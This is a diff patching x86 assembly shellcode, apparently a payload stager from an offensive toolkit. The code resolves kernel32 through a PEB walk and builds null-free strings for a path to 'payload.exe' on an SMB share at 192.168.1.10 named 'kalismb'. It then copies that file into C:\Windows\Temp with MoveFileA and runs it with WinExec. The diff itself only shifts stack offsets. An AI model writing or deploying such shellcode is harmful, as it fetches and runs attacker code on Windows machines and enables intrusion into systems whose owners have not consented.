@@ -120,7 +120,7 @@ main:
     mov  ebp, esp
     xor  ecx, ecx
     mov  ecx, 0x01010301
-    xor  ecx, 0x01010201
+    xor  ecx, 0x01010101
     sub  esp, ecx
 
     ; Bootstrap: find kernel32 via PEB walk
@@ -149,7 +149,7 @@ main:
 ; -- String Construction --
 
 ; --- src_path: "\\192.168.1.10\kalismb\payload.exe" (mov) ---
-    lea  edi, [ebp-0xa4]
+    lea  edi, [ebp-0x124]
 ; emit_mov: "\\192.168.1.10\kalismb\payload.exe" (null-safe)
 ; 36 bytes written to [edi]
 
@@ -174,7 +174,7 @@ main:
     mov  [edi+0x20], eax
 
 ; --- dst_path: "C:\Windows\Temp\payload.exe" (mov) ---
-    lea  edi, [ebp-0xc0]
+    lea  edi, [ebp-0x140]
 ; emit_mov: "C:\Windows\Temp\payload.exe" (null-safe)
 ; 28 bytes written to [edi]
 
@@ -226,9 +226,9 @@ wf_hang_1:
 wf_entry:
 
     ; MoveFileA(lpExistingFileName, lpNewFileName)
-    lea  eax, [ebp-0xc0]
+    lea  eax, [ebp-0x140]
     push eax                      ; lpNewFileName
-    lea  eax, [ebp-0xa4]
+    lea  eax, [ebp-0x124]
     push eax                      ; lpExistingFileName
     call dword ptr [ebp-0x24]
     mov  [ebp-0x30], eax
@@ -243,7 +243,7 @@ wf_run_payload:
     ; WinExec(lpCmdLine, uCmdShow)
     xor  eax, eax
     push eax                      ; uCmdShow
-    lea  eax, [ebp-0xc0]
+    lea  eax, [ebp-0x140]
     push eax                      ; lpCmdLine
     call dword ptr [ebp-0x28]
     mov  [ebp-0x34], eax
